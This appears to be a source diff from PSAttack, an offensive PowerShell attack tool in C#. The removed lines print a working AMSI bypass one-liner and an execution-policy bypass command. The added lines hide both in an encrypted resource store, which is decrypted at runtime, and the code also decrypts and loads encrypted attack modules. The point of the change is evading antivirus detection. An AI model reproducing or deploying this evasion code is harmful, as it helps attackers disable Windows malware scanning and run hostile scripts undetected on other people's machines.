@@ -26,12 +26,30 @@ namespace PSAttack
             AttackState attackState = new AttackState();
             attackState.cursorPos = attackState.promptLength;
 
-            // AMSI bypass care of @mattifestion (https://twitter.com/mattifestation/status/735261120487772160)
+
+            // Get Encrypted Values
+            Assembly assembly = Assembly.GetExecutingAssembly();
+            Stream valueStream = assembly.GetManifestResourceStream("PSAttack.Resources." + Properties.Settings.Default.valueStore);
+            MemoryStream valueStore = CryptoUtils.DecryptFile(valueStream);
+            string valueStoreStr = Encoding.Unicode.GetString(valueStore.ToArray());
+
+            string[] valuePairs = valueStoreStr.Replace("\r","").Split('\n');
+
+            foreach (string value in valuePairs)
+            {
+                if (value != "")
+                {
+                    string[] entry = value.Split('|');
+                    attackState.decryptedStore.Add(entry[0], entry[1]);
+                }
+            }
+
+            // amsi bypass (thanks matt!!)
             if (Environment.OSVersion.Version.Major > 9)
             {
                 try
                 {
-                    attackState.cmd = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
+                    attackState.cmd = attackState.decryptedStore["amsiBypass"];
                     Processing.PSExec(attackState);
                 }
                 catch
@@ -41,22 +59,21 @@ namespace PSAttack
             }
 
             // Decrypt modules
-            Assembly assembly = Assembly.GetExecutingAssembly();
             string[] resources = assembly.GetManifestResourceNames();
             foreach (string resource in resources)
             {
-                if (resource.Contains(".enc"))
+                if (resource.Contains("PSAttack.Modules."))
                 {
-                    string fileName = resource.Replace("PSAttack.Modules.","").Replace(".ps1.enc","");
+                    string fileName = resource.Replace("PSAttack.Modules.", "");
                     string decFilename = CryptoUtils.DecryptString(fileName);
                     Console.ForegroundColor = PSColors.loadingText;
-                    Console.WriteLine("Decrypting: " + decFilename);
+                    Console.WriteLine("Decrypting: {0}", decFilename);
                     Stream moduleStream = assembly.GetManifestResourceStream(resource);
                     PSAUtils.ImportModules(attackState, moduleStream);
                 }
             }
             // Setup PS env
-            attackState.cmd = "set-executionpolicy bypass -Scope process -Force";
+            attackState.cmd = attackState.decryptedStore["setExecutionPolicy"];
             Processing.PSExec(attackState);
 
             // check for admin 
